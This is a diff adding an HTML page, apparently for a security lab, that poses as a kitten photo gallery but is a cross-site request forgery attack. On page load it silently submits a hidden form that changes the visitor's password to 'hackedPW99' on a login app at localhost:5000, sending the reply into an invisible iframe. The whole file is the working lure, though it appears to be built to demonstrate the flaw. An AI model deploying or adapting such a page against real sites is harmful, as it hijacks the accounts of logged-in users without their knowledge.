@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Beautiful Kittens!</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
+</head>
+
+<body onload="document.csrfForm.submit()">
+    <div class="container">
+        <h1>Look at these beautiful kittens!</h1>
+        <div class="row">
+            <div class="col">
+                <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%3Fid%3DOIP.MRQJhxsWrQjuqVwHvFVPigHaFj%26pid%3DApi&f=1" class="rounded img-thumbnail" alt="Evil Kitten 1">
+            </div>
+            <div class="col">
+                <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%3Fid%3DOIP.o2ICN9rJnSd6YAqq7ONSJwHaFj%26pid%3DApi&f=1" class="rounded img-thumbnail" alt="Evil Kitten 2">
+            </div>
+            <div class="col">
+                <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%3Fid%3DOIP.MUmVN5LeGEUq6-Lc4hs0IwHaFj%26pid%3DApi&f=1" class="rounded img-thumbnail" alt="Evil Kitten 3">
+            </div>
+        </div>
+        <div class="row">
+            <div class="col">
+                <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%3Fid%3DOIP.3l5Sl36RAg1Qtis6r_N62gHaFi%26pid%3DApi&f=1" class="rounded img-thumbnail" alt="Evil Kitten 4">
+            </div>
+            <div class="col">
+                <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%3Fid%3DOIP.ud0eFcXlpt1aPwj7Wv4VtwHaHa%26pid%3DApi&f=1" class="rounded img-thumbnail" alt="Evil Kitten 5">
+            </div>
+            <div class="col">
+                <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse2.mm.bing.net%2Fth%3Fid%3DOIP.HzVvxRM7cdngaHJOqQsisAHaFj%26pid%3DApi&f=1" class="rounded img-thumbnail" alt="Evil Kitten 6">
+            </div>
+        </div>
+        <button class="primary">Like</button>
+    </div>
+    <form action="http://localhost:5000/pythonlogin/password" method="POST" target="hiddenFrame" name="csrfForm">
+        <input type="hidden" name="newPW" value="hackedPW99">
+        <input type="hidden" name="confPW" value="hackedPW99">
+    </form>
+    <iframe name="hiddenFrame" style="display: none;"></iframe>
+</body>
+
+</html>
